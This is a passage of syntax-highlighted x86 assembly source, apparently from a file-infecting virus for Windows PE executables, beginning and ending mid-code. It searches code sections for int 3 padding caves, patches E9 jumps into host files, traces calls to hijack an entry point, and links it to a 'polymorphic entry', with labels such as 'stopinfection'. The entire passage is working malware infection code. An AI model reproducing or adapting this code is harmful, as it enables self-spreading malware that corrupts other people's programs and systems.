</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gothootme</span><span class="sc0">

</span><span class="sc5">getthatmoo</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">getthatmoo1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">caca1</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getthatmoo1</span><span class="sc0">             </span><span class="sc1">; calculate dead space</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">returnme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">; set it</span><span class="sc0">

</span><span class="sc5">gothootme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">caca1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; errorit</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">loadcave</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getonecave</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0CCCCCCCCh</span><span class="sc0">          </span><span class="sc1">; seek for int 3 </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">googoom</span><span class="sc0">                     </span><span class="sc1">; places</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getonecave</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">googoom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">getitsan</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0CCh</span><span class="sc0">         </span><span class="sc1">; watch if exact size</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">goawaycave</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getitsan</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; not found, search after</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">goawaycave</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; we got it</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getonecave</span><span class="sc0">

</span><span class="sc5">Offset2RVA</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">makeaconnectjmp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Offset2RVA</span><span class="sc0">              </span><span class="sc1">; connect jumps</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">stopinfection</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">connectval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">connectval</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">hookres</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">

</span><span class="sc5">callcount</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lastcall</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">fixstart</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">fixload</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">fixedx</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; fix callcount value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lastcall</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; fix lastcall value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixstart</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; fix fixstart value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixload</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; fix fixload value</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixedx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; fix fixedx value</span><span class="sc0">

</span><span class="sc1">;push   edx</span><span class="sc0">
</span><span class="sc1">;push   esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000001111111100000000b</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; start of import</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; eax = start of import</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; start of code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2048</span><span class="sc0">

</span><span class="sc5">loopitlong</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">disasmit</span><span class="sc0">                    </span><span class="sc1">; disasm instruction</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">timetogiveup</span><span class="sc0">                    </span><span class="sc1">; 2048 instruction</span><span class="sc0">
                            </span><span class="sc1">; passed ?</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">timetogiveup</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">iiRET</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">contimetogiveup</span><span class="sc0">                 </span><span class="sc1">; a ret found ?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">timetogiveup</span><span class="sc0">                    </span><span class="sc1">; too much callcount ?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">loopitlong</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lastcall</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; set esi the call</span><span class="sc0">
                            </span><span class="sc1">; originator</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lastcall</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loopitlong</span><span class="sc0">

</span><span class="sc5">contimetogiveup</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopitlong</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">iiJMP</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">checkCALL</span><span class="sc0">                   </span><span class="sc1">; if instruction was</span><span class="sc0">
                            </span><span class="sc1">; a jump</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">fixstart</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; jump there then</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">jmpgoaway</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">jmpgoaway</span><span class="sc0">                   </span><span class="sc1">; valid jump ?</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">jmpgoaway</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">checkCALL</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">iiCALL</span><span class="sc0">              </span><span class="sc1">; was a call ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopitlong</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lastcall</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; set instruction</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;cmp    dword ptr [esp+callcount],1</span><span class="sc0">
</span><span class="sc1">;jne    loopitlong</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">callcount</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">loopitlong</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; not too low call, trace it!</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loopitlong</span><span class="sc0">

</span><span class="sc5">timetogiveup</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixload</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load the last call</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skipthisoneP</span><span class="sc0">                </span><span class="sc1">; noone ? bad news !</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; load the value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lastcall</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; make the last call</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixstart</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; linking to start of</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">fixedx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; mini messing routine</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; that is a linker to the</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; polymorphic entry</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">skipthisoneP</span><span class="sc4">:</span><span class="sc0">

